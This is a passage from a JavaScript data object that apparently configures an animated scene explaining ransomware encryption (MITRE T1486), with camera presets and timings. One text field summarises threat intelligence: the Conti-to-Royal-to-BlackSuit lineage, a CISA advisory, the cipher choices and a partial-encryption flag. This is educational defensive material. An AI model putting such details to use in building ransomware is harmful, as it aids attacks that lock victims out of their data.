          "technicalParallel": "Documented in Sysmon Event 11 (recording RansomwareLineage=Conti -> Royal -> BlackSuit , CISA AA24-219A, CryptoEngine=Statically linked OpenSSL AES-256-CBC + RSA-4096, EncryptionPercentageFlag=-ep 50…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Phone Desk",
          "position": [
            -6.3,
            4.2,
            8.4
          ],
          "target": [
            -4.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Vault Locks",
          "position": [
            4.3,
            4.2,
            8.4
          ],
          "target": [
            2.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Partial Lock",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1486"
    }
  }
};
